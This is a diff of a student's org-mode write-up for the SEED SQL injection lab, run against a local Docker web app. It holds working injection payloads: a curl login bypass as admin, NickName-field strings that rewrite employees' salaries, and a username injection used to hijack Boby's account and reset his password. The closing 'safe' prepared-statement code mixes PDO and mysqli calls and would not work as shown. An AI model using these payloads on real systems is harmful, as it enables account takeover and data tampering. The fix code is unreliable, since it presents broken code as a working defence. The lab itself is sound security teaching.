@@ -1,11 +1,11 @@
-* Setup 
+* Setup
 *** cd category-web/Web_SQL_Injection/Labsetup
 *** docker-compose up
 *** add 10.9.0.5 with host name www.seed-server.com in /etc/hosts file in the host machine
 *** Go to www.seed-server.com and if you find the login page then the setup is complete
 
 
-* Task 1 
+* Task 1
 *** docker exec -it mysql-10.9.0.6 /bin/bash
 *** mysql -u root -pdees
 *** use sqllab_users;
@@ -13,7 +13,7 @@
 *** select * from credential where Name='Alice';
 *** Get the screenshot
 
-#+CAPTION: Employee Record of Alice 
+#+CAPTION: Employee Record of Alice
 [[./screenshots/task-1-alice-record.png]]
 
 
@@ -26,4 +26,45 @@
 ** Task 2.2
 *** curl -s 'www.seed-server.com/unsafe_home.php?username=admin%27%3b%23&Password=123'
 *** Run [[./scripts/task-2_2.sh]] to automatically verify whether the request can get you logged as admin.
-** 
+** Task 2.3
+*** The countermeasure that is preventing us to run two SQL statements is that PHP's mysqli::query() function doesn't support more than one query.
+    And whenever we are trying to inject multiple queries the operation fails and we get syntax error.
+
+
+* Task 3
+** Task 3.1
+*** Putting {{',salary=30000 where EID=10000;#}} in the NickName field will update the salary of Alice.
+** Task 3.2
+*** Get the Employee ID of Boby from the Admin page. (EID=20000)
+*** Putting {{',salary=1 where EID=20000;#}} in the NickName field will update the salary of Boby.
+** Task 3.3
+*** Type {{Boby';#}} in the username field and anything in the password field and get access to Boby's profile page.
+*** Simply go to the Edit Profile Page and insert a new password e.g. {{BadBossBoby}} in the Password Field and click Save.
+*** Now we can sign in using {{Boby}} as username and {{BadBossBoby}} as password.
+
+
+* Task 4
+#+NAME: Prepared SQL
+#+BEGIN_SRC php
+$sql = "SELECT id, name, eid, salary, ssn FROM credential where name=:name and Password=:password";
+
+if ($stmt = $conn->prepare($sql)) {
+    $stmt->bindParam(':name', $input_uname);
+    $stmt->bindParam(':password', $input_pwd);
+    $stmt->execute();
+    $result = $stmt->get_result();
+    if ($result->num_rows > 0) {
+        // only take the first row
+        $firstrow = $result->fetch_assoc();
+        $id     = $firstrow["id"];
+        $name   = $firstrow["name"];
+        $eid    = $firstrow["eid"];
+        $salary = $firstrow["salary"];
+        $ssn    = $firstrow["ssn"];
+    }
+}
+#+END_SRC
+
+#+CAPTION: Using prepared statements we are no longer able to inject SQL
+[[./screenshots/task-4-safe-prepared-sql.png]]
+
